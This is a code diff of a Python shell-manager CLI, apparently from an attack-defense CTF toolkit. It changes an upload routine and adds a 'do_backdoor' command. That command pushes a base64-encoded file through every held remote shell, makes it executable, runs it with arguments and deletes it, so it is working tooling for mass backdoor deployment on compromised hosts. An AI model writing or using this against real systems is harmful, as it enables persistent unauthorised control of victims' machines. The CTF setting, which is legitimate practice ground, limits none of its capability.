@@ -109,7 +109,35 @@ class ShellManagerCli(Cmd):
         if not os.path.exists(file_path):
             self.write("{} not exists\n".format(file_path))
             return
-        command = "echo {0} | base64 -d > {1}/{2}; ls {1}".format(base64.b64encode(open(file_path, 'rb').read()), save_path, filename)
+        command = "echo {0} | base64 -d > {1}; ls {1}".format(base64.b64encode(open(file_path, 'rb').read()), save_path)
+        for shell_name, io in ios:
+            self.write('[{}]\n'.format(shell_name))
+            try:
+                output = self.check_output(io, command)
+            except Exception as e:
+                io.close()
+                self.write(
+                    "[-] {} Broken ... Removed\n".format(shell_name))
+                self.shells.pop(shell_name)
+                continue
+            self.write(output)
+
+    def do_backdoor(self, arg):
+        res = arg.split(None, 3)
+        if len(res) != 4:
+            self.write("Usage: upload TARGETS FILENAME(which in upload directory) SAVEPATH BACKDOOR_ARGS\n")
+            return
+        print("!!!!!!!!!!!!!!!!!!!!!", res)
+        target = res[0].strip()
+        ios = self.get_ios(target)
+        filename = res[1].strip()
+        save_path = res[2].strip()
+        args = res[3].strip()
+        file_path = os.path.join(awdpwn_path, 'upload', filename)
+        if not os.path.exists(file_path):
+            self.write("{} not exists\n".format(file_path))
+            return
+        command = "echo {0} | base64 -d > {1}; ls {1}; chmod +x {1}; {1} {2}; rm -f {1}".format(base64.b64encode(open(file_path, 'rb').read()), save_path, args)
         for shell_name, io in ios:
             self.write('[{}]\n'.format(shell_name))
             try:
